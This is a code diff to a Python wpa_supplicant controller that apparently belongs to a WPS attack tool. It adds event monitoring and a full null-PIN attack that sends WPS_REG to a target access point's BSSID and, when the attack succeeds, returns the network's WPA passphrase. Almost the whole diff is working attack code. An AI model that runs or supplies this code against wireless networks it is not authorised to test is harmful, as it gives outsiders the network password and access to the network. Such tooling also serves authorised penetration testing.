@@ -179,6 +179,11 @@ class WPASupplicantController:
         response = self._send_command("PING")
         if response != "PONG":
             raise WPSAttackError(f"wpa_supplicant PING failed: {response}")
+        
+        # Attach to receive unsolicited events
+        response = self._send_command("ATTACH")
+        if "OK" not in response:
+            raise WPSAttackError(f"wpa_supplicant ATTACH failed: {response}")
     
     def stop(self) -> None:
         """Terminate wpa_supplicant and cleanup.
@@ -361,11 +366,75 @@ class WPASupplicantController:
         """Attempt null PIN (WPS_REG without PIN parameter).
         
         Some APs accept association without a PIN (pixie-vulnerable).
+        This sends WPS_REG command WITHOUT any PIN parameter.
         """
-        # Null PIN is attempted by not providing pin parameter
-        # This is different from empty string - it's omitted entirely
-        # For now, we use empty string which wpa_supplicant interprets as null
-        return self.try_pin(bssid, "", timeout=timeout)
+        bssid_normalized = normalize_bssid(bssid)
+        progress = AttackProgress()
+        started_at = time.time()
+        
+        # Send WPS_REG without PIN parameter (true null PIN)
+        cmd = f"WPS_REG {bssid_normalized}"
+        
+        response = self._send_command(cmd)
+        if "OK" not in response:
+            return AttackResult(
+                bssid=bssid_normalized,
+                ssid="",
+                method=AttackMethod.NULL_PIN,
+                outcome=AttackOutcome.ERROR,
+                attempts=1,
+                finished_at=datetime.now(timezone.utc),
+                message=f"WPS_REG command rejected: {response}",
+            )
+        
+        progress.attempts = 1
+        
+        # Monitor wpa_supplicant events
+        while time.time() - started_at < timeout:
+            try:
+                events = self._receive_events(timeout=1.0)
+                for event in events:
+                    self._process_event(event, progress, collect_pixie=False)
+                    
+                    if progress.status == "GOT_PSK":
+                        self._send_command("WPS_CANCEL", expect_response=False)
+                        return AttackResult(
+                            bssid=bssid_normalized,
+                            ssid=progress.essid,
+                            method=AttackMethod.NULL_PIN,
+                            outcome=AttackOutcome.SUCCESS,
+                            attempts=progress.attempts,
+                            finished_at=datetime.now(timezone.utc),
+                            wps_pin="(null)",
+                            network_key=progress.wpa_psk,
+                        )
+                    
+                    elif progress.status in ("WSC_NACK", "WPS_FAIL"):
+                        self._send_command("WPS_CANCEL", expect_response=False)
+                        return AttackResult(
+                            bssid=bssid_normalized,
+                            ssid=progress.essid,
+                            method=AttackMethod.NULL_PIN,
+                            outcome=AttackOutcome.FAILURE,
+                            attempts=progress.attempts,
+                            finished_at=datetime.now(timezone.utc),
+                            message="Null PIN rejected",
+                        )
+            
+            except socket.timeout:
+                continue
+        
+        # Timeout reached
+        self._send_command("WPS_CANCEL", expect_response=False)
+        return AttackResult(
+            bssid=bssid_normalized,
+            ssid=progress.essid,
+            method=AttackMethod.NULL_PIN,
+            outcome=AttackOutcome.TIMEOUT,
+            attempts=progress.attempts,
+            finished_at=datetime.now(timezone.utc),
+            message=f"Attack exceeded {timeout}s timeout",
+        )
     
     def try_pbc(
         self,
